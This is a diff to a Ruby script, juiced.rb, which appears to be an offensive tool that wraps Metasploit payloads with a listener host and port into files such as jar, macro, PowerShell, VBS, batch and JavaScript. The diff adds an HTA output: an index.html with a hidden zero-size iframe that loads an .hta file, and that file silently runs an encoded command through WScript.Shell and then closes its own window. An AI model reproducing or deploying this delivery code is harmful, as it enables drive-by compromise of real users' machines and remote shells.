@@ -1,13 +1,13 @@
 #!/usr/bin/env ruby
 #Author: Andrew Bonstrom
-#v1.7
+#v1.8
 #Credits to: Matthew Graber - Beastly PS Attack technique, TrustedSec group - Idea with Unicorn.py
 require 'open3'
 require 'base64'
 def usage
 	puts "Usage: ruby juiced.rb <msf/Venom/Payload> <lhost> <lport> <payloadFormatOption> <fileName>\n\n"
 	puts "Note: A fileName is required for payload formats that output a file."
-	puts "Payload Format Option: jar, war, macro, ps, vbs, asp, bat, and js."
+	puts "Payload Format Option: jar, war, macro, ps, vbs, asp, bat, js, and hta"
 end
 #######################################################################################################################
 #Payload Functions Begin
@@ -156,6 +156,27 @@ def gen_batFile(base64Command, fileName)
                 f.write("@ECHO OFF\n" + base64Command)
         end
 end
+def gen_htaFile(base64Command, fileName)
+	#HTML File String
+	htlmStr = <<EOS
+<iframe id="frame" src="fileName.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>
+EOS
+	#HTA File String
+	htaStr = <<EOS
+<script>
+a=new ActiveXObject("WScript.Shell");
+a.run('base64Command', 0);window.close();
+</script>
+EOS
+	#Writes out html index file
+	File.open("index.html", "w") do |f|
+		f.write(htlmStr.to_s.sub("fileName", fileName))
+	end
+	#Writes out .hta file
+	File.open(fileName + ".hta", "w") do |f|
+		f.write(htaStr.to_s.sub("base64Command", base64Command))
+	end
+end
 ##################################################################################################################
 #Payload Functions End
 ##################################################################################################################
@@ -233,6 +254,9 @@ else
 	when "bat"
 		puts "Now creating file with .bat extension, please check local directory.\n\n"
 		gen_batFile(command, ARGV[4])
+	when "hta"
+		puts "Now creating file with .hta extension, please check local directory.\n\n"
+		gen_htaFile(command, ARGV[4])
 	else
 	puts "You forgot to specify a payload extension."
 	end
